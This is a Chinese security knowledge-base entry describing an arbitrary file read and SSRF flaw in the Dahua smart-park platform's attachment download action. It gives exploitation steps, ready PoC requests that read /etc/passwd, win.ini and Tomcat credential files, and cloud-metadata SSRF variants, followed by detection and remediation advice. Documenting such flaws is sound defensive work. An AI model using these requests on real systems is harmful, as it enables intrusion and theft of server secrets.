---
id: web-java-component-dahua-attachment-downloadbyurlatt-fileread
title: 大华智慧园区 AttachmentAction downloadByUrlAtt：filePath 直入 URL.openStream 任意文件读取
type: scenario
domain: web
path: web/java/component
technique: dahua-attachment-downloadbyurlatt-fileread
tags:
- java
- dahua
- wpms
- struts2
- file-read
- file-protocol
- url-openstream
- download
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V211
  verified_at: '2026-11-07T04:48:57+08:00'
  notes: 已对照原文与 img55-57 核对：/portal/itc/attachment_downloadByUrlAtt.action、filePath setter 绑定、type=1 分支、ISO-8859-1→UTF-8 转换、new URL(filePath).openStream() 与原文一致。未验证点：原文未附响应截图，PoC 未在本机复跑。
url: /docs/web/java/component/web-java-component-dahua-attachment-downloadbyurlatt-fileread/
draft: false
kb_aliases:
- 大华智慧园区 任意文件读取
- downloadByUrlAtt
- filePath=file:/etc/passwd
- attachment_downloadByUrlAtt.action
- URL.openStream 文件读取
- Struts2 参数绑定 filePath
---

## 一句话结论

大华智慧园区 `/portal/itc/attachment_downloadByUrlAtt.action` 的 `filePath` 由 Struts2 参数绑定到 `AttachmentAction` 字段，`downloadByUrlAtt` 对 `filePath` 做编码转换后直接 `new URL(filePath).openStream()` 并写入响应，传 `file:/etc/passwd` 即可读取服务器任意文件（也可用 `http://` 做 SSRF）。

## 原理

- Struts2 的 `portal` 配置把 `attachment_*` 映射到 `AttachmentAction`；`filePath` 有 setter，请求参数会自动绑定到 action 字段。
- `downloadByUrlAtt` 在 `type=1` 且能取到 WebService 配置时拼出完整路径，否则直接使用 `filePath`；随后把 `filePath` 从 ISO-8859-1 转成 UTF-8，`new URL(this.filePath).openStream()` 打开输入流，再把字节写入 `response.getOutputStream()`，并设置 `Content-disposition` 下载文件名。
- Java 的 `URL` 支持多种协议：`file:` 打开本地文件，`http:`/`https:` 发起外部请求，`jar:`/`ftp:` 等也可能被支持。代码没有协议/路径白名单，因此 `file:/etc/passwd` 直接读取本地文件；`http://169.254.169.254/...` 可做 SSRF。
- 为什么成立：`URL.openStream()` 等价于 `openConnection().getInputStream()`，对 `file:` 协议直接读本地文件系统；下载逻辑把内容原样回显给攻击者，形成任意文件读取。
- 边界：`filePath` 需要能通过 Struts2 参数绑定/拦截器；`type=1` 分支可能改写路径，测试时优先不带 `type` 或按实际配置调整。

## 触发条件

- 目标为大华智慧园区平台，`/portal/itc/attachment_downloadByUrlAtt.action` 可访问。
- `filePath` 参数可绑定到 `AttachmentAction.filePath`，且请求进入 `downloadByUrlAtt` 方法。
- 应用进程对目标文件有读权限；目标文件路径使用 `file:` 协议可被 `java.net.URL` 解析。
- 若走 `type=1` 分支，需要存在 WebService 配置；否则直接使用传入路径。

## 利用步骤

1. 访问 `/portal/itc/attachment_downloadByUrlAtt.action?filePath=file:/etc/passwd`，观察响应是否为 `/etc/passwd` 内容。
2. Windows 目标尝试 `file:/c:/windows/win.ini`、`file:///C:/Windows/win.ini`。
3. 读取应用配置/源码：`file:/opt/tomcat/webapps/.../WEB-INF/web.xml`、`file:/opt/tomcat/conf/tomcat-users.xml` 等。
4. 若 `file:` 被限制，尝试 `http://127.0.0.1:8080/...` 做 SSRF、`jar:file:/...!/` 等协议。
5. 结合其他漏洞（如文件上传）读取/覆盖关键文件，或读取数据库配置进一步横向。

## PoC

```http
GET /portal/itc/attachment_downloadByUrlAtt.action?filePath=file:/etc/passwd HTTP/1.1
Host: target
```

```http
GET /portal/itc/attachment_downloadByUrlAtt.action?filePath=file:/c:/windows/win.ini HTTP/1.1
Host: target
```

```java
// 危险逻辑（示意）
this.filePath = new String(this.filePath.getBytes("ISO-8859-1"), "UTF-8");
URL url = new URL(this.filePath);
InputStream fis = url.openStream();
// 复制到 response.getOutputStream()
```

## 变体与关联

- 变体：`filePath` 使用 `http://`/`https://` 变成 SSRF，访问内网服务/云元数据；`jar:`、`ftp:` 等协议视 JDK 支持情况。
- 变体：同一 action 的 `downloadByUrlAtt` 可能还有 `type`/`fileName` 参数影响路径拼接，测试不同组合。
- 关联：[[web-generic-file-inclusion-java-new-file-root-path-traversal-read]]（Java 文件读取）、[[web-generic-ssrf-curl-gopher-loopback-admin]]（URL 协议 SSRF）、[[web-java-component-dahua-attachment-cleartempfile-recid-sqli]]（同一 AttachmentAction 的 SQL 注入）。
- 边界：`open_basedir`/SecurityManager（旧 JDK）可能限制文件读取；高版本 JDK 对 `file:` 无额外限制；原文未给出响应截图，PoC 需在授权环境验证。

## 检测与防御

- **检测特征**：请求参数含 `file:`、`file://`、`jar:`、`http://127.0.0.1`、`169.254.169.254`；下载接口返回非业务文件内容；响应头 `Content-disposition` 与请求路径不匹配。
- **修复**：禁止用户控制 URL 协议；只允许从固定文件存储根目录读取，使用 `getCanonicalPath` 做前缀校验；或改为按附件 ID 查询数据库映射路径。
- **加固**：禁用 `file:`/`jar:` 等协议；出站网络限制；WAF 拦截 `filePath=file:`；应用进程最小文件权限。
